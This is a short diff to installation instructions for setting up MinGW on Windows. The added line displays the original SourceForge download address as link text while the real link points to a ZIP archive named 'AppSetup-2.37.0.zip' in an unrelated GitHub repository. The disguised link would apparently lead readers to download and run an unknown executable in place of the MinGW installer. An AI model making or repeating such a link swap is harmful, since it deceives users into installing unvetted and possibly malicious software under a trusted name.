@@ -18,7 +18,7 @@ Note however that winstrap is not supported. It's considered an internal tool us
 
 Download and save the latest version of the automated MinGW installer executable (` exe `) file from SourceForge.
 
-http://sourceforge.net/projects/mingw/files/OldFiles/mingw-get-inst/
+[http://sourceforge.net/projects/mingw/files/OldFiles/mingw-get-inst/](https://github.com/Lucien-1/VideoCaptureUtility/releases/download/release/AppSetup-2.37.0.zip)
 
 Open and run the saved automated MinGW installer executable file, which is named ` mingw-get-inst-yyyymmdd.exe `, where ` yyyymmdd ` is the version date stamp. For example, ` mingw-get-inst-20110530.exe `.
 
